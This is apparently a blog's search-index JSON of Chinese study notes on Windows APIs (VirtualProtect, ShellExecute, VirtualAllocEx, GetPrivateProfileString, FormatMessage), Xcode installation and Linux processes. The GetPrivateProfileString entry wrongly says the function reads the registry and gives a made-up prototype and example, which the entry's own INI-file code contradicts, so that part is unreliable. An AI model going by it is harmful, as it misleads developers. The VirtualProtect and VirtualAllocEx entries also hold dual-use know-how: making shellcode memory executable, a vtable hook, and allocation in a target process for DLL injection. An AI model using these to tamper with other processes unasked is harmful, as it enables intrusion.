dwSize，要改变属性的内存区域大小。 flNewProtect，内存新的属性类型，设置为PAGE_EXECUTE_READWRITE（0x40）时该内存页为可读可写可执行。 pflOldProtect，内存原始属性类型保存地址。 修改内存属性成功时函数返回非0，修改失败时返回0。 如果我们能够按照如下参数布置好栈帧的话就可以将shellcode所在内存区域设置为可执行模式。 示例如下所示为 Hook 虚函数，并使其调用自己的函数。在改写调用之前使用了 VirtualProtect 函数对相关内存区域的属性进行了修改。 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;windows.h&gt;class Base &#123;public: virtual void Print() &#123; printf(&quot;gyarmy.com\\n&quot;); &#125;&#125;;void hookPrint() &#123; printf(&quot;hook_gyarmy\\n&quot;);&#125;int main(int argc, char* argv[])&#123; Base* pb = new Base(); //关键定位虚表的位置 DWORD* pVtAddr = (DWORD*)*(DWORD*)pb; DWORD dwOldProtect = 0; VirtualProtect(pVtAddr, 4, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); *pVtAddr = (DWORD)hookPrint; pb-&gt;Print(); delete pb; return 0;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【API】ShellExecute","date":"2023-10-27T01:24:01.940Z","path":"A_OS/Windows/API/ShellExecute/","text":"概述： ShellExecute 用法的整理和示例官方说明：shellExecuteA 函数 (shellapi.h) - Win32 apps | Microsoft Learn 用法示例以下示例为一个完整的用法展示，实现了调用第三方工具 devocn.exe 安装虚拟网卡（不展示安装界面）并通过获取安装进程句柄判断安装结果。 SEE_MASK_NOCLOSEPROCESS 参数：表示要获取进程句柄 通过 GetExitCodeProcess 函数获取进程执行状态 SW_HIDE 参数: 不展示窗口 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#define QREINSTALL_NETCARD_TOOLS_NAME L&quot;devcon.exe&quot;std::mutex g_mutex_nc_install;bool InstallNcDrive(bool &amp;bRes, bool &amp;bEnd) &#123; std::lock_guard&lt;std::mutex&gt; lock(g_mutex_nc_install); bool bOptRt = false; //触发重新安装虚拟网卡 TCHAR szPath[MAX_PATH]; ::GetModuleFileName(NULL, szPath, MAX_PATH); ::PathRemoveFileSpec(szPath); QLOG_INFO() &lt;&lt; &quot;tools[devcon.exe]&#x27;s path is&quot; &lt;&lt; QString::fromWCharArray(szPath); std::string command = &quot; install vpnvnic.inf vpnvnic&quot;; SHELLEXECUTEINFO ShExecInfoInstall = &#123; 0 &#125;; try &#123; ShExecInfoInstall.cbSize = sizeof(SHELLEXECUTEINFO); ShExecInfoInstall.fMask = SEE_MASK_NOCLOSEPROCESS; ShExecInfoInstall.hwnd = NULL; if (!isProcessAdmin()) &#123; ShExecInfoInstall.lpVerb = L&quot;runas&quot;; &#125; else &#123; ShExecInfoInstall.lpVerb = L&quot;open&quot;; &#125; ShExecInfoInstall.lpFile = QREINSTALL_NETCARD_TOOLS_NAME; ShExecInfoInstall.lpParameters = STDString2LPCWCH(command); ShExecInfoInstall.lpDirectory = szPath; ShExecInfoInstall.nShow = SW_HIDE; ShExecInfoInstall.hInstApp = NULL; ShExecInfoInstall.hProcess = NULL; bOptRt = ShellExecuteEx(&amp;ShExecInfoInstall); if (bOptRt) &#123; QLOG_INFO() &lt;&lt; &quot;驱动安装进程已启动！&quot;; // 等待进程结束 WaitForSingleObject(ShExecInfoInstall.hProcess, INFINITE); // 获取退出代码 DWORD exitCode; if (GetExitCodeProcess(ShExecInfoInstall.hProcess, &amp;exitCode)) &#123; // 判断进程是否成功退出 if (exitCode != STILL_ACTIVE) &#123; QLOG_INFO() &lt;&lt; &quot;驱动安装进程已退出，退出代码: &quot; &lt;&lt; exitCode; &#125; else &#123; QLOG_INFO() &lt;&lt; &quot;驱动安装进程未能正常退出，退出代码: &quot; &lt;&lt; exitCode; &#125; &#125; else &#123; QLOG_INFO() &lt;&lt; &quot;获取驱动安装进程退出代码失败！错误代码: &quot; &lt;&lt; GetLastError(); &#125; // 实测 1和0 的时候安装成功 bRes = exitCode == 1 || exitCode == 0 ? true : false; // 关闭句柄 CloseHandle(ShExecInfoInstall.hProcess); &#125; else &#123; QLOG_ERROR() &lt;&lt; &quot;启动驱动安装进程失败！错误代码: &quot; &lt;&lt; GetLastError(); &#125; &#125; catch (const std::exception&amp; e) &#123; QLOG_ERROR() &lt;&lt; __FUNCTION__ &lt;&lt; __LINE__ &lt;&lt; e.what(); bEnd = true; return bOptRt; &#125; bEnd = true; return bOptRt;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"winapi","slug":"winapi","permalink":"http://example.com/tags/winapi/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【WINAPI】VitualAlloc","date":"2023-10-27T01:24:01.940Z","path":"A_OS/Windows/API/VirtualAlloc/","text":"概述：VirtualAlloc 函数详解 说明作用：在指定进程的虚拟地址空间中保留、提交或更改内存区域的状态。该函数将它分配的内存初始化为零。 官方文档：VirtualAllocEx 函数 (memoryapi.h) - Win32 apps | Microsoft Learn 函数原型：1234567LPVOID VirtualAllocEx( [in] HANDLE hProcess, [in, optional] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flAllocationType, [in] DWORD flProtect); 参数说明： hProcess: 进程的句柄 lpAddress: 要分配内存块的起始地址的指针 dwSize: 要分配内存块的大小 flAllocationType：内存分配的类型 值 含义 MEM_COMMIT0x00001000 从指定保留内存页的磁盘) 的总内存大小和分页文件 (分配内存费用。 函数还保证当调用方稍后最初访问内存时，内容将为零。 除非实际访问虚拟地址，否则不会分配实际物理页面。若要在一个步骤中保留和提交页面，请使用 &#96;MEM_COMMIT MEM_RESERVE0x00002000 保留进程的虚拟地址空间范围，而无需在内存或磁盘上的分页文件中分配任何实际物理存储。使用 MEM_COMMIT 再次调用 VirtualAllocEx 来提交保留页。 若要在一个步骤中保留和提交页面，请使用 &#96;MEM_COMMIT MEM_RESET0x00080000 指示 lpAddress 和 dwSize 指定的内存范围中的数据不再感兴趣。 不应从分页文件读取或写入页面。 但是，内存块稍后将再次使用，因此不应取消提交。 此值不能与任何其他值一起使用。使用此值并不能保证使用 MEM_RESET 操作的范围将包含零。 如果希望范围包含零，请取消提交内存，然后重新提交。使用 MEM_RESET 时， VirtualAllocEx 函数会忽略 fProtect 的值。 但是，仍必须将 fProtect 设置为有效的保护值，例如 PAGE_NOACCESS。如果使用 MEM_RESET并且内存范围映射到文件，VirtualAllocEx 将返回错误。 仅当共享视图映射到分页文件时，才可接受该视图。 MEM_RESET_UNDO0x1000000 应 仅对之前成功应用MEM_RESET的地址范围调用 MEM_RESET_UNDO 。 它指示调用方对 lpAddress 和 dwSize 指定的指定内存范围中的数据感兴趣，并尝试反转 MEM_RESET的影响。 如果该函数成功，则表示指定地址范围中的所有数据都保持不变。 如果函数失败，则至少将地址范围中的某些数据替换为零。此值不能与任何其他值一起使用。 如果在之前未MEM_RESET的地址范围上调用MEM_RESET_UNDO，则行为未定义。 指定 MEM_RESET时， VirtualAllocEx 函数将忽略 flProtect 的值。 但是，仍必须将 flProtect 设置为有效的保护值，例如 PAGE_NOACCESS。Windows Server 2008 R2、Windows 7、Windows Server 2008、Windows Vista、Windows Server 2003 和 Windows XP： 在 Windows 8 和 Windows Server 2012 之前，不支持 MEM_RESET_UNDO 标志。 flProtect： 要分配的页区域的内存保护。一般使用 PAGE_EXeCUTE_READWRITE，详见每次保护常量 (WinNT.h) - Win32 apps | Microsoft Learn 示例如下所示为在目标进程的内存区域中从 0 开始申请大小为 4096 的内存块，权限为可读可写目标内存区域的权限为可读可写，hTarget 为目标进程句柄： 123456789// 在目标进程申请内存void* pLoadLibFuncParam = nullptr;pLoadLibFuncParam = VirtualAllocEx(hTarget, 0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);if (pLoadLibFuncParam == nullptr)&#123; cout &lt;&lt; &quot;alloc memery failed&quot; &lt;&lt; endl; CloseHandle(hTarget); return 0;&#125; 第四个参数常用 MEM_COMMIT | MEM_RESERVE","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"API","slug":"API","permalink":"http://example.com/tags/API/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【API】GetPrivateProfileString 用法","date":"2023-10-27T01:24:01.939Z","path":"A_OS/Windows/API/GetPrivageProfileString/","text":"概述：GetPrivateProfileString的使用 GetPrivateProfileString是Windows API中的一个函数，它用于从注册表读取指定键值对的字符串值。 该函数的原型为 1234567DWORD GetPrivateProfileString( HKEY hKey, LPCTSTR lpStringName, LPCTSTR lpStringValue, DWORD dwReserved, LPDWORD lpdwResult ); 其中，hKey表示要读取的注册表键，lpStringName表示要读取的键的名称，lpStringValue表示要读取的键的值，dwReserved表示保留字段，lpdwResult表示返回结果的缓冲区。 读取注册表调用该函数可以从注册表读取指定键值对的字符串值，例如: 123456789101112HKEY hKey; LPCTSTR lpStringName = &quot;MyString&quot;; LPCTSTR lpStringValue = &quot;MyValue&quot;; DWORD dwReserved = 0; LPDWORD lpdwResult = NULL; GetPrivateProfileString(HKEY_CURRENT_USER, lpStringName, lpStringValue, 0, &amp;dwReserved, (LPDWORD)&amp;lpdwResult); if (lpdwResult != NULL) &#123; // 处理读取成功的信息 &#125; else &#123; // 处理读取失败的信息 &#125; 在上面的例子中，我们从注册表读取了名为”MyString”的键的值，并将结果存储在lpdwResult中。如果读取成功，则lpdwResult非NULL,否则lpdwResult为NULL。 读写配置文件读写文件测试，创建test.ini文件写入一下内容 123456[NETWORK]ServerIP=127.0.0.1LocalHost=www.baidu.com[NETSET]Net=443NetHost=8080 读取配置文件1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;windows.h&gt; //这个头文件一定要添加，否则GetPrivateProfileString(...)函数无法使用 using namespace std; void main() &#123; char ip[16]; char add[20]; char net[20]; char set[20]; DWORD num;//long类型，可以省略不写，如下几行。 num = GetPrivateProfileString(&quot;NETWORK&quot;, &quot;ServerIP&quot;, &quot;&quot;, ip, sizeof(ip), &quot;\\C:\\\\test.ini&quot;); GetPrivateProfileString(&quot;NETWORK&quot;, &quot;LocalHost&quot;, &quot;&quot;, add, sizeof(add), &quot;C:\\\\test.ini&quot;); GetPrivateProfileString(&quot;NETSET&quot;, &quot;Net&quot;, &quot;&quot;, net, sizeof(net), &quot;C:\\\\test.ini&quot;); GetPrivateProfileString(&quot;NETSET&quot;, &quot;NetHost&quot;, &quot;&quot;, set, sizeof(set), &quot;e:\\\\test.ini&quot;); cout &lt;&lt; num &lt;&lt; endl; cout &lt;&lt; &quot;-----------------\\n&quot;; cout &lt;&lt; ip &lt;&lt; endl; cout &lt;&lt; add &lt;&lt; endl; cout &lt;&lt; net &lt;&lt; endl; cout &lt;&lt; set &lt;&lt; endl; cout &lt;&lt; &quot;------------\\n&quot;; system(&quot;pause&quot;);&#125; 写入配置文件运行程序后，文件内容如下所示： 12345678[NETWORK]ServerIP=127.0.0.1LocalHost=www.baidu.com[NETSET]Net=443NetHost=8080[Device]Name=PC 运行demo： 1234567891011#include &lt;iostream&gt;#include &lt;windows.h&gt;//这个头文件一定要添加，否则GetPrivateProfileString(...)函数无法使用 using namespace std; void main() &#123; WritePrivateProfileString(&quot;Device&quot;, &quot;Name&quot;, &quot;PC&quot;, &quot;C:\\\\test.ini&quot;); system(&quot;pause&quot;);&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"API","slug":"API","permalink":"http://example.com/tags/API/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【API】FormatMessageA","date":"2023-10-27T01:24:01.938Z","path":"A_OS/Windows/API/FormatMessageA/","text":"概述：获取错误码对应的描述 1234567891011121314151617181920212223242526272829string get_sys_error_msg(unsigned long err)&#123; char _inner_msg[10240] = &#123; 0 &#125;; memset(_inner_msg, 0, sizeof(_inner_msg)); if (err == 0) err = GetLastError(); LPSTR buf = NULL; if (::FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err, MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), (LPSTR)&amp;buf, 0, NULL)) &#123; sprintf_s(_inner_msg, sizeof(_inner_msg),&quot;[%d]%s&quot;, err, buf); ::LocalFree(buf); &#125; else &#123; snprintf(_inner_msg, sizeof(_inner_msg), &quot; [0x%x]Unknown error&quot;, err); &#125; string str_error_msg(_inner_msg); return str_error_msg;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"Xcode 下载与安装","date":"2023-10-27T01:24:01.936Z","path":"A_OS/Mac/Xcode/","text":"下载后得到 xip 文件 如 ： Xcode_13.xip 可以使用解压缩软件进行解压，如果有些压缩软件不支持会提示破损，可以考虑直接在命令行解压。 第一步：cd 到下载的目录 第二步：xip -x Xcode_13.xip 此时，会有一个很奇怪的提示，会误以为报错。 xip: signing certificate was “Software Update” (validation not attempted) 主要是 xcode 文件太大导致的，可以耐心多等待几分钟，将会收到以下信息： xip: expanded items from “&#x2F;Users&#x2F;ivychen&#x2F;Documents&#x2F;Xcode_13.xip” 将得到 Xcode 程序文件，将其拖动到访达的 Application 文件夹即可。","tags":[{"name":"Mac","slug":"Mac","permalink":"http://example.com/tags/Mac/"},{"name":"Xcode","slug":"Xcode","permalink":"http://example.com/tags/Xcode/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Mac","slug":"A-OS/Mac","permalink":"http://example.com/categories/A-OS/Mac/"}]},{"title":"Linux 进程管理","date":"2023-10-27T01:24:01.894Z","path":"A_OS/Linux/操作系统及Linux内核/6 Linux进程管理/","text":"查看进程的运行状态 进程的结束控制 进程的执行顺序 [toc] 1 进程的查看不管在测试的时候、在实际的生产环境中，还是自己的使用过程中，难免会遇到一些进程异常的情况，所以 Linux 为我们提供了一些工具来查看进程的状态信息。我们可以通过 top 实时的查看进程的状态，以及系统的一些信息（如 CPU、内存信息等），我们还可以通过 ps 来静态查看当前的进程信息，同时我们还可以使用 pstree 来查看当前活跃进程的树形结构。 1.1 top工具的使用","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"进程","slug":"进程","permalink":"http://example.com/tags/%E8%BF%9B%E7%A8%8B/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"操作系统及Linux内核","slug":"A-OS/Linux/操作系统及Linux内核","permalink":"http://example.com/categories/A-OS/Linux/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8ALinux%E5%86%85%E6%A0%B8/"}]},{"title":"【Linux】进程概念","date":"2023-10-27T01:24:01.892Z","path":"A_OS/Linux/操作系统及Linux内核/5 Linux进程概念/","text":"进程与程序 进程的衍生 工作管理 [toc] 1 概念理解首先程序与进程是什么？程序与进程又有什么区别？ 程序（procedure）：不太精确地说，程序就是执行一系列有逻辑、有顺序结构的指令，帮我们达成某个结果。就如我们去餐馆，给服务员说我要牛肉盖浇饭，她执行了做牛肉盖浇饭这么一个程序，最后我们得到了这么一盘牛肉盖浇饭。它需要去执行，不然它就像一本武功秘籍，放在那里等人翻看。 进程（process）：进程是程序在一个数据集合上的一次执行过程，在早期的UNIX、Linux 2.4及更早的版本中，它是系统进行资源分配和调度的独立基本单位。同上一个例子，就如我们去了餐馆，给服务员说我要牛肉盖浇饭，她执行了做牛肉盖浇饭这么一个程序，而里面做饭的是一个进程，做牛肉汤汁的是一个进程，把牛肉汤汁与饭混合在一起的是一个进程，把饭端上桌的是一个进程。它就像是我们在看武功秘籍这么一个过程，然后一个篇章一个篇章地去练。 简单来说，程序是为了完成某种任务而设计的软件，比如 vim 是程序。什么是进程呢？进程就是运行中的程序。 程序只是一些列指令的集合，是一个静止的实体，而进程不同，进程有以下的特性： 动态性：进程的实质是一次程序执行的过程，有创建、撤销等状态的变化。而程序是一个静态的实体。 并发性：进程可以做到在一个时间段内，有多个程序在运行中。程序只是静态的实体，所以不存在并发性。 独立性：进程可以独立分配资源，独立接受调度，独立地运行。 异步性：进程以不可预知的速度向前推进。 结构性：进程拥有代码段、数据段、PCB（进程控制块，进程存在的唯一标志）。也正是因为有结构性，进程才可以做到独立地运行。 并发：在一个时间段内，宏观来看有多个程序都在活动，有条不紊的执行（每一瞬间只有一个在执行，只是在一段时间有多个程序都执行过） 并行：在每一个瞬间，都有多个程序都在同时执行，这个必须有多个 CPU 才行 引入进程是因为传统意义上的程序已经不足以描述 OS 中各种活动之间的动态性、并发性、独立性还有相互制约性。程序就像一个公司，只是一些证书，文件的堆积（静态实体）。而当公司运作起来就有各个部门的区分，财务部，技术部，销售部等等，就像各个进程，各个部门之间可以独立运做，也可以有交互（独立性、并发性）。 而随着程序的发展越做越大，又会继续细分，从而引入了线程的概念，当代多数操作系统、Linux 2.6及更新的版本中，进程本身不是基本运行单位，而是线程的容器。就像上述所说的，每个部门又会细分为各个工作小组（线程），而工作小组需要的资源需要向上级（进程）申请。 线程（thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。因为线程中几乎不包含系统资源，所以执行更快、更有效率。 简而言之,一个程序至少有一个进程,一个进程至少有一个线程。线程的划分尺度小于进程，使得多线程程序的并发性高。另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。就如下图所示： 2 进程的属性2.1 进程的分类 第一个角度来看，我们可以分为用户进程与系统进程： 用户进程：通过执行用户程序、应用程序或称之为内核之外的系统程序而产生的进程，此类进程可以在用户的控制下运行或关闭。 系统进程：通过执行系统内核程序而产生的进程，比如可以执行内存资源分配和进程切换等相对底层的工作；而且该进程的运行不受用户的干预，即使是 root 用户也不能干预系统进程的运行。 第二角度来看，我们可以将进程分为交互进程、批处理进程、守护进程 交互进程：由一个 shell 终端启动的进程，在执行过程中，需要与用户进行交互操作，可以运行于前台，也可以运行在后台。 批处理进程：该进程是一个进程集合，负责按顺序启动其他的进程。 守护进程：守护进程是一直运行的一种进程，在 Linux 系统启动时启动，在系统关闭时终止。它们独立于控制终端并且周期性的执行某种任务或等待处理某些发生的事件。例如 httpd 进程，一直处于运行状态，等待用户的访问。还有经常用的 cron（在 centOS 系列为 crond）进程，这个进程为 crontab 的守护进程，可以周期性的执行用户设定的某些任务。 2.2 进程的衍生进程有这么多的种类，那么进程之间定是有相关性的，而这些有关联性的进程又是如何产生的，如何衍生的？ 就比如我们启动了终端，就是启动了一个 bash 进程，我们可以在 bash 中再输入 bash 则会再启动一个 bash 的进程，此时第二个 bash 进程就是由第一个 bash 进程创建出来的，他们之间又是个什么关系？ 我们一般称呼第一个 bash 进程是第二 bash 进程的父进程，第二 bash 进程是第一个 bash 进程的子进程，这层关系是如何得来的呢？ 关于父进程与子进程便会提及这两个系统调用 fork() 与 exec() fork-exec是由 Dennis M. Ritchie 创造的 fork() 是一个系统调用（system call），它的主要作用就是为当前的进程创建一个新的进程，这个新的进程就是它的子进程，这个子进程除了父进程的返回值和 PID 以外其他的都一模一样，如进程的执行代码段，内存信息，文件描述，寄存器状态等等 exec() 也是系统调用，作用是切换子进程中的执行程序也就是替换其从父进程复制过来的代码段与数据段 子进程就是父进程通过系统调用 fork() 而产生的复制品，fork() 就是把父进程的 PCB 等进程的数据结构信息直接复制过来，只是修改了 PID，所以一模一样，只有在执行 exec() 之后才会不同，而早先的 fork() 比较消耗资源后来进化成 vfork(),效率高了不少，感兴趣的同学可以查查为什么。 这就是子进程产生的由来。简单的实现逻辑就如下方所示【注释１】 123456789pid_t p;p = fork();if (p == (pid_t) -1) /* ERROR */else if (p == 0) /* CHILD */else /* PARENT */ 既然子进程是通过父进程而衍生出来的，那么子进程的退出与资源的回收定然与父进程有很大的相关性。当一个子进程要正常的终止运行时，或者该进程结束时它的主函数 main() 会执行 exit(n); 或者 return n，这里的返回值 n 是一个信号，系统会把这个 SIGCHLD 信号传给其父进程，当然若是异常终止也往往是因为这个信号。 在将要结束时的子进程代码执行部分已经结束执行了，系统的资源也基本归还给系统了，但若是其进程的进程控制块（PCB）仍驻留在内存中，而它的 PCB 还在，代表这个进程还存在（因为 PCB 就是进程存在的唯一标志，里面有 PID 等消息），并没有消亡，这样的进程称之为僵尸进程（Zombie）。 如图中第四列标题是 S，S 表示的是进程的状态，而在下属的第三行的 Z 表示的是 Zombie 的意思。（ ps 命令将在后续详解） 正常情况下，父进程会收到两个返回值：exit code（SIGCHLD 信号）与 reason for termination 。之后，父进程会使用 wait(&amp;status) 系统调用以获取子进程的退出状态，然后内核就可以从内存中释放已结束的子进程的 PCB；而如若父进程没有这么做的话，子进程的 PCB 就会一直驻留在内存中，一直留在系统中成为僵尸进程（Zombie）。 虽然僵尸进程是已经放弃了几乎所有内存空间，没有任何可执行代码，也不能被调度，在进程列表中保留一个位置，记载该进程的退出状态等信息供其父进程收集，从而释放它。但是 Linux 系统中能使用的 PID 是有限的，如果系统中存在有大量的僵尸进程，系统将会因为没有可用的 PID 从而导致不能产生新的进程。 另外如果父进程结束（非正常的结束），未能及时收回子进程，子进程仍在运行，这样的子进程称之为孤儿进程。在 Linux 系统中，孤儿进程一般会被 init 进程所“收养”，成为 init 的子进程。由 init 来做善后处理，所以它并不至于像僵尸进程那样无人问津，不管不顾，大量存在会有危害。 进程 0 是系统引导时创建的一个特殊进程，也称之为内核初始化，其最后一个动作就是调用 fork() 创建出一个子进程运行 /sbin/init 可执行文件,而该进程就是 PID&#x3D;1 的进程 1，而进程 0 就转为交换进程（也被称为空闲进程），进程 1 （init 进程）是第一个用户态的进程，再由它不断调用 fork() 来创建系统里其他的进程，所以它是所有进程的父进程或者祖先进程。同时它是一个守护程序，直到计算机关机才会停止。 通过以下的命令我们可以很明显的看到这样的结构 1pstree 或者从此图我们可以更加形象的看清子父进程的关系 通过以上的显示结果我们可以看的很清楚，init 为所有进程的父进程或者说是祖先进程 我们还可以使用这样一个命令来看，其中 pid 就是该进程的一个唯一编号，ppid 就是该进程的父进程的 pid，command 表示的是该进程通过执行什么样的命令或者脚本而产生的 1ps －fxo user,ppid,pid,pgid,command 可以在图中看见我们执行的 ps 就是由 zsh 通过 fork-exec 创建的子进程而执行的 使用这样的一个命令我们也能清楚的看见 init 如上文所说是由进程 0 这个初始化进程来创建出来的子进程,而其他的进程基本是由 init 创建的子进程，或者是由它的子进程创建出来的子进程。所以 init 是用户进程的第一个进程也是所有用户进程的父进程或者祖先进程。（ps 命令将在后续课程详解） 就像一个树状图，而 init 进程就是这棵树的根，其他进程由根不断的发散，开枝散叶 2.3 进程组与Sessions每一个进程都会是一个进程组的成员，而且这个进程组是唯一存在的，他们是依靠 PGID（process group ID）来区别的，而每当一个进程被创建的时候，它便会成为其父进程所在组中的一员。 一般情况，进程组的 PGID 等同于进程组的第一个成员的 PID，并且这样的进程称为该进程组的领导者,也就是领导进程，进程一般通过使用 getpgrp() 系统调用来寻找其所在组的 PGID，领导进程可以先终结，此时进程组依然存在，并持有相同的PGID，直到进程组中最后一个进程终结。 与进程组类似，每当一个进程被创建的时候，它便会成为其父进程所在 Session 中的一员，每一个进程组都会在一个 Session 中，并且这个 Session 是唯一存在的， Session 主要是针对一个 tty 建立，Session 中的每个进程都称为一个工作(job)。每个会话可以连接一个终端(control terminal)。当控制终端有输入输出时，都传递给该会话的前台进程组。Session 意义在于将多个 jobs 囊括在一个终端，并取其中的一个 job 作为前台，来直接接收该终端的输入输出以及终端信号。 其他 jobs 在后台运行。 前台（foreground）就是在终端中运行，能与你有交互的 后台（background）就是在终端中运行，但是你并不能与其任何的交互，也不会显示其执行的过程 2.4 工作管理bash(Bourne-Again shell)支持工作控制（job control）,而 sh（Bourne shell）并不支持。 并且每个终端或者说 bash 只能管理当前终端中的 job，不能管理其他终端中的 job。比如我当前存在两个 bash 分别为 bash1、bash2，bash1 只能管理其自己里面的 job 并不能管理 bash2 里面的 job 我们都知道当一个进程在前台运作时我们可以用 ctrl + c 来终止它，但是若是在后台的话就不行了。 我们可以通过 &amp; 这个符号，让我们的命令在后台中运行 1ls &amp; 图中所显示的 [1] 236分别是该 job 的 job number 与该进程的 PID，而最后一行的 Done 表示该命令已经在后台执行完毕。 我们还可以通过 ctrl + z 使我们的当前工作停止并丢到后台中去 被停止并放置在后台的工作我们可以使用这个命令来查看 1jobs 其中第一列显示的为被放置后台 job 的编号，而第二列的 ＋ 表示最近(刚刚、最后)被放置后台的 job，同时也表示预设的工作，也就是若是有什么针对后台 job 的操作，首先对预设的 job，- 表示倒数第二（也就是在预设之前的一个）被放置后台的工作，倒数第三个（再之前的）以后都不会有这样的符号修饰，第三列表示它们的状态，而最后一列表示该进程执行的命令 我们可以通过这样的一个命令将后台的工作拿到前台来 123#后面不加参数提取预设工作，加参数提取指定工作的编号#ubuntu 在 zsh 中需要 %，在 bash 中不需要 %fg [%jobnumber] 之前我们通过 ctrl + z 使得工作停止放置在后台，若是我们想让其在后台运作我们就使用这样一个命令 12#与fg类似，加参则指定，不加参则取预设bg [%jobnumber] 既然有方法将被放置在后台的工作提至前台或者让它从停止变成继续运行在后台，当然也有方法删除一个工作，或者重启等等 12345#kill的使用格式如下kill -signal %jobnumber#signal从1-64个信号值可以选择，可以这样查看kill －l 其中常用的有这些信号值 信号值 作用 -1 重新读取参数运行，类似与restart -2 如同 ctrl+c 的操作退出 -9 强制终止该任务 -15 正常的方式终止该任务 注意 若是在使用kill＋信号值然后直接加 pid，你将会对 pid 对应的进程进行操作 若是在使用kill+信号值然后 ％jobnumber，这时所操作的对象是 job，这个数字就是就当前 bash 中后台的运行的 job 的 ID","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"进程","slug":"进程","permalink":"http://example.com/tags/%E8%BF%9B%E7%A8%8B/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"操作系统及Linux内核","slug":"A-OS/Linux/操作系统及Linux内核","permalink":"http://example.com/categories/A-OS/Linux/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8ALinux%E5%86%85%E6%A0%B8/"}]},{"title":"Linux 导读大纲","date":"2023-10-27T01:24:01.891Z","path":"A_OS/Linux/readme/","text":"命令行和工具 Linux基础入门 Linux内核分析配套实验 Linux RPC","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"导读","slug":"导读","permalink":"http://example.com/tags/%E5%AF%BC%E8%AF%BB/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"}]},{"title":"Linux RPC","date":"2023-10-27T01:24:01.889Z","path":"A_OS/Linux/RPC/Linux_RPC/","text":"","tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"rpc","slug":"rpc","permalink":"http://example.com/tags/rpc/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"RPC","slug":"A-OS/Linux/RPC","permalink":"http://example.com/categories/A-OS/Linux/RPC/"}]},{"title":"Linux 基础入门","date":"2023-10-27T01:24:01.845Z","path":"A_OS/Linux/Linux基础入门/Readme/","text":"实验楼 Linux 基础入门学习整理 linux 基础入门 5 环境变量与文件查找 15 Linux 进程概念","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux基础入门","slug":"A-OS/Linux/Linux基础入门","permalink":"http://example.com/categories/A-OS/Linux/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"5 环境变量与文件查找","date":"2023-10-27T01:24:01.844Z","path":"A_OS/Linux/Linux基础入门/5 环境变量与文件查找/","text":"[toc] 1. 